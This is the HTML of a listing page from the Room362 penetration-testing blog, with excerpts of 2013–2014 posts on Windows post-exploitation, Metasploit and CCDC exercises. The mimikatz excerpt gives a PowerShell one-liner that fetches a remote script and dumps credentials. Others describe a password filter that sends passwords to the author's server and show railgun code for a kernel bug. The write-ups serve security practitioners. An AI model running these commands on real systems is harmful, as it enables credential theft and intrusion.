<!DOCTYPE html>
<html lang="en">

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Home of mubix, the infosec treehugger">
  <meta name="generator" content="Hugo 0.16" />

  <title>Room362</title>

  
  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">

  <!--[if lte IE 8]>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
  <![endif]-->
  <!--[if gt IE 8]><!-->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
  <!--<![endif]-->

  <!--[if lte IE 8]>
  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
  <![endif]-->
  <!--[if gt IE 8]><!-->
  <link rel="stylesheet" href="/css/side-menu.css">
  <!--<![endif]-->

  <link rel="stylesheet" href="/css/blackburn.css">

  
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

  
  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">

  
  <link rel="alternate" type="application/rss+xml" title="Room362" href="//room362.com/index.xml" />

  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/androidstudio.min.css">
  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>
  

  <link rel="shortcut icon" href="//room362.com/img/favicon.ico" type="image/x-icon" />

</head>


<body>
<div id="layout">

  
<a href="#menu" id="menuLink" class="menu-link">
  
  <span></span>
</a>
<div id="menu">

  

  <div class="pure-menu">
    <ul class="pure-menu-list">
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/brandon/"><i class='fa fa-users fa-fw'></i>Brandon</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
      
        </li>
      
      
        <li class="pure-menu-item">
          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
      
        </li>
      
    </ul>
  </div>

  <div class="pure-menu social">
  <ul class="pure-menu-list">

    <li class="pure-menu-item">
      <a class="pure-menu-link" href="//room362.com/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
    </li>

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://twitter.com/mubix" target="_blank"><i class="fa fa-twitter fa-fw"></i>Twitter</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://facebook.com/mubix" target="_blank"><i class="fa fa-facebook fa-fw"></i>Facebook</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://plus.google.com/+mubix" target="_blank"><i class="fa fa-google-plus-square fa-fw"></i>Google+</a>
    </li>
    

    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://instagram.com/mubix" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://flickr.com/photos/mubix" target="_blank"><i class="fa fa-flickr fa-fw"></i>Flickr</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://youtube.com/user/hak5" target="_blank"><i class="fa fa-youtube fa-fw"></i>YouTube</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://vimeo.com/mubix" target="_blank"><i class="fa fa-vimeo fa-fw"></i>Vimeo</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="http://slideshare.net/mubix" target="_blank"><i class="fa fa-slideshare fa-fw"></i>SlideShare</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://linkedin.com/in/mubix" target="_blank"><i class="fa fa-linkedin fa-fw"></i>LinkedIn</a>
    </li>
    

    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://reddit.com/user/mubix" target="_blank"><i class="fa fa-reddit fa-fw"></i>Reddit</a>
    </li>
    

    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https://github.com/mubix" target="_blank"><i class="fa fa-github-alt fa-fw"></i>GitHub</a>
    </li>
    

    
    <li class="pure-menu-item">
      <a class="pure-menu-link" href="https:////bitbucket.org/mubix" target="_blank"><i class="fa fa-bitbucket fa-fw"></i>Bitbucket</a>
    </li>
    

    

  </ul>
</div>

  <div class="pure-g">
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>&copy; 2016. All rights reserved.</small>
  </div>
  <div class="small-print pure-u-1 pure-u-md-1-1">
    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
  </div>
</div>

</div>


  <div id="main">


<div class="header">
  <h1>Room362</h1>
  <h2>Blatherings of a security addict</h2>
</div>

<div class="content">
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">Application Whitelist Bypass using IEexec.exe</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>16 Jan 2014, 12:30</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Guest post by @infosecsmith2 There was a recent presentation at DerbyCon, entitled: Living Off the Land: A Minimalistâ€™s Guide to Windows Post-Exploitation by Christopher Campbell &amp; Matthew Graeber I highly recommend that you start with this presentation as it lays the foundation for this post. The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.
  </p>

  
  <footer>
    <a href="/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2014/2014-01-13-installing-metasploit-community-edition-on-windows-8/">Installing Metasploit Community Edition on Windows 8</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>13 Jan 2014, 14:32</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Show URL: Hak5 Youtube URL: YouTube Show RSS feed: RSS
  </p>

  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2014/2014-01-10-extapi-pranks/">ExtAPI Pranks</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>10 Jan 2014, 01:21</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Since I&rsquo;ve been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find OJ&rsquo;s write up on it and more amazing things he did in 3 months of meterpreter and on the Metasploit blog. Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone.
  </p>

  
  <footer>
    <a href="/post/2014/2014-01-10-extapi-pranks/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2014/2014-01-09-alive-again/">Alive Again</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>09 Jan 2014, 22:42</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  I&rsquo;ve taken a rather long hiatus from blogging. This is mostly because I was fed up with the blogging platform that I had (Squarespace) and didn&rsquo;t really have any alternatives that met all of the features I wanted. So, where am I at now? Github actually. Github allows users to create &ldquo;Github Pages&rdquo; for repositories (or be it&rsquo;s own repo). For the most part these pages are written in Markdown. It&rsquo;s late and I don&rsquo;t feel like looking up who, but someone created a project called &ldquo;Jekyll&rdquo; which is a Ruby based static page generator and then another project called &ldquo;Octopress&rdquo; popped up using Jekyll to create a static html based blogging platform.
  </p>

  
  <footer>
    <a href="/post/2014/2014-01-09-alive-again/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2014/2014-01-06-metasploit-minute-mondays-with-mubix/">Metasploit Minute - Mondays with Mubix - Episode 1</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>06 Jan 2014, 14:30</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Show URL: Hak5 Youtube URL: YouTube Show RSS feed: RSS
  </p>

  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/">Dumping a domain worth of passwords with mimikatz</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>05 Oct 2013, 23:53</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  clymb3r recently posted a script called &ldquo;Invoke-Mimikatz.ps1&rdquo; basically what this does is reflectively injects mimikatz into memory, calls for all the logonPasswords and exits. It even checks the targets architecture (x86/x64) first and injects the correct DLL. You can very easily use this script directly from an admin command prompt as so: powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds&quot; (This works REALLY well for Citrix and Kiosk scenarios and it&rsquo;s too hard to type/remember) This runs the powershell script by directly pulling it from Github and executing it &ldquo;in memory&rdquo; on your system.
  </p>

  
  <footer>
    <a href="/post/2013/2013-10-05-dumping-a-domain-worth-of-passwords-with-mimikatz/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2013/2013-10-04-ad-zone-transfers-as-a-user/">AD Zone Transfers as a user</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>04 Oct 2013, 23:47</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  cross posted from: http://carnal0wnage.attackresearch.com/2013/10/ad-zone-transfers-as-user.html The tired and true method for Zone Transfers are using either nslookup: nslookup ls -d domain.com.local Or dig: dig -t AXFR domain.com.local @ns1.domain.com.local In the Windows Enterprise world there are a few more options. If you are a DNS Admin you can use the &lsquo;dnscmd&rsquo; command like so: dnscmd /EnumZones dnscmd /ZonePrint domain.com.local Which is handy if you can pop the DNS server (usually the Domain Controller so you usually have better things to do at that point).
  </p>

  
  <footer>
    <a href="/post/2013/2013-10-04-ad-zone-transfers-as-a-user/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2013/2013-09-11-stealing-passwords-every-time-they-change/">Stealing passwords every time they change</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>11 Sep 2013, 00:28</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  Password Filters [0].aspx&rdquo;) are a way for organizations and governments to enforce stricter password requirements on Windows Accounts than those available by default in Active Directory Group Policy. It is also fairly documented on how to Install and Register Password Filters [1]. Basically what it boils down to is updating a registry key here: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages with the name of a DLL (without the extension) that you place in Windows\System32 For National CCDC earlier this year (2013), I created an installer and &ldquo;evil pass filter&rdquo; that basically installed itself as a password filter and any time any passwords changed it would store the change to a log file locally to the victim (in clear text) as well as issue an HTTP basic auth POST to a server I own with the username and password.
  </p>

  
  <footer>
    <a href="/post/2013/2013-09-11-stealing-passwords-every-time-they-change/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/">Changing proxychains hardcoded DNS server</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>10 Sep 2013, 13:16</time>
  </div>

  

  

  

</div>

  </header>

  <p>
  If you&rsquo;ve ever used proxychains to push things through Meterpreter, one of the most annoying things is its &ldquo;hardcoded&rdquo; DNS setting for 4.2.2.2, if the org that you are going after doesn&rsquo;t allow this out of their network, or if you are trying to resolve an internal asset, you&rsquo;re SOL. After a ton of googling and annoyed head slams into walls every time I forget where this is I&rsquo;ve finally decided to make a note of it.
  </p>

  
  <footer>
    <a href="/post/2013/2013-09-10-changing-proxychains-hardcoded-dns-server/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  
    
      <article>
  <header>
    <h2><a href="//room362.com/post/2013/2013-08-10-unkillable-processes/">Unkillable Processes</a></h2>

    <div class="post-meta">

  <div>
    <i class="fa fa-calendar fa-fw"></i>
    <time>10 Aug 2013, 10:39</time>
  </div>

  

  

  
  
  
  <div>
    <i class="fa fa-tags fa-fw"></i>
    
      <a class="post-taxonomy-tag" href="//room362.com/tags/railgun">railgun</a>&nbsp;&#47;
    
      <a class="post-taxonomy-tag" href="//room362.com/tags/x64">x64</a>&nbsp;&#47;
    
      <a class="post-taxonomy-tag" href="//room362.com/tags/incomplete">incomplete</a>&nbsp;&#47;
    
      <a class="post-taxonomy-tag" href="//room362.com/tags/ccdc">ccdc</a>
    
  </div>
  
  

</div>

  </header>

  <p>
  Saw this post about a kernel bug in 64 bit Windows that is a DoS, it can also create an unkillable process: Blog post: http://waleedassar.blogspot.com/2013/02/kernel-bug-1-processiopriority.html Figured I&rsquo;d take a swing at making a module that I could put Meterpreter into an unkillable state. Good times at CCDC could be had. Started with the C code for the bug: http://pastebin.com/QejGQXib along with the only resource I could find about the actual function: http://processhacker.sourceforge.net/doc/ntfill_8h.html#a6557e0dd024f0e9fa6132eb52d12810a I came up with this: client.railgun.add_function('ntdll','ZwSetInformationProcess','DWORD',[ [&quot;DWORD&quot;,&quot;ProcessHandle&quot;,&quot;in&quot;], [&quot;DWORD&quot;,&quot;ProcessInformationClass&quot;,&quot;in&quot;], [&quot;DWORD&quot;,&quot;ProcessInformation&quot;,&quot;inout&quot;], [&quot;DWORD&quot;,&quot;ProcessInformationLength&quot;,&quot;in&quot;], ]) processinfo = 0x8000F129 tproc = client.sys.process.open tmem = tproc.memory.allocate(4) tproc.memory.write(tmem,processinfo) cpidhandle = client.railgun.kernel32.GetCurrentProcess()['return'] client.railgun.ntdll.ZwSetInformationProcess(cpidhandle,0x21,tmem,0x4) ScriptJunkie quickly identified that I was using a DWORD for a Handle and using 4 bits for a 64 bit process (should be 8) as well as the fact that I could use a PDWORD with the ProcessInformation inout parameter instead of writing it to memory myself.
  </p>

  
  <footer>
    <a href="/post/2013/2013-08-10-unkillable-processes/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
  </footer>
  
</article>

    
  

  
<nav class="pagination" role="pagination">
  
  <a href="/page/4/"><i class="fa fa-angle-double-left"></i></a>
  
  <span>5 / 46</span>
  
  <a href="/page/6/"><i class="fa fa-angle-double-right"></i></a>
  
</nav>



</div>

</div>
</div>
<script src="//room362.com/js/ui.js"></script>


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-198967-1', 'auto');
  ga('send', 'pageview');

</script>



</body>
</html>

